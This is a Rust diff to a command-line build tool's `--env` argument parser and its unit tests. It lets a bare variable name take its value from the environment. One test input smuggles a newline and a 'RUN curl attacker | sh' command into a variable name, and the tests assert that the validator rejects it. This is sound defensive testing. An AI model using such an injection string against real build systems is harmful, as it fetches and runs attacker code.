@@ -59,9 +59,9 @@ pub struct ProjectArgs {
     /// App subdirectory relative to the project path.
     #[arg(long)]
     pub subdir: Option<String>,
-    /// Set a build variable, repeatable (`--env KEY=VALUE`).
-    #[arg(long = "env", value_name = "KEY=VALUE", value_parser = parse_env_pair)]
-    pub env: Vec<(String, String)>,
+    /// Set a build variable, repeatable (`--env NAME` or `--env NAME=VALUE`).
+    #[arg(long = "env", value_name = "NAME[=VALUE]", value_parser = parse_env_arg)]
+    pub env: Vec<(String, Option<String>)>,
 }
 
 impl ProjectArgs {
@@ -78,17 +78,19 @@ impl ProjectArgs {
     }
 }
 
-/// Split a `--env` argument, keeping `=` in the value (base64, URLs, JWTs).
-pub fn parse_env_pair(raw: &str) -> Result<(String, String), String> {
-    let (name, value) = raw
-        .split_once('=')
-        .ok_or_else(|| format!("expected KEY=VALUE, got {raw:?}"))?;
+/// Split a `--env` argument into a name and, if one was written inline, a
+/// value. Splits on the first `=` only, so a value keeps its own.
+pub fn parse_env_arg(raw: &str) -> Result<(String, Option<String>), String> {
+    let (name, value) = match raw.split_once('=') {
+        Some((name, value)) => (name, Some(value.to_owned())),
+        None => (raw, None),
+    };
     if !anybuild::is_valid_env_name(name) {
         return Err(format!(
             "invalid environment variable name {name:?}: expected letters, digits and underscores, not starting with a digit"
         ));
     }
-    Ok((name.to_owned(), value.to_owned()))
+    Ok((name.to_owned(), value))
 }
 
 /// Wasmer connection settings shared by `build`, `deploy` (and `auto`
@@ -212,7 +214,7 @@ mod tests {
         let project = ProjectArgs {
             path: "/tmp/project".into(),
             subdir: Some("apps/dashboard".to_owned()),
-            env: vec![("FOO".to_owned(), "bar".to_owned())],
+            env: vec![("FOO".to_owned(), Some("bar".to_owned()))],
         };
 
         let shared = project.shared();
@@ -223,14 +225,19 @@ mod tests {
     }
 
     #[test]
-    fn env_pairs_split_on_the_first_equals_only() {
+    fn env_args_split_on_the_first_equals_only() {
         assert_eq!(
-            parse_env_pair("TOKEN_B64=YWJj=="),
-            Ok(("TOKEN_B64".to_owned(), "YWJj==".to_owned()))
+            parse_env_arg("TOKEN_B64=YWJj=="),
+            Ok(("TOKEN_B64".to_owned(), Some("YWJj==".to_owned())))
         );
-        assert!(parse_env_pair("NO_SEPARATOR").is_err());
-        assert!(parse_env_pair("=orphaned").is_err());
-        assert!(parse_env_pair("HAS SPACES=x").is_err());
-        assert!(parse_env_pair("SAFE value\nRUN curl attacker | sh #=x").is_err());
+        // No `=`: the value is read from the environment, so it stays out of
+        // this process's command line.
+        assert_eq!(
+            parse_env_arg("DATABASE_URL"),
+            Ok(("DATABASE_URL".to_owned(), None))
+        );
+        assert!(parse_env_arg("=orphaned").is_err());
+        assert!(parse_env_arg("HAS SPACES=x").is_err());
+        assert!(parse_env_arg("SAFE value\nRUN curl attacker | sh #=x").is_err());
     }
 }
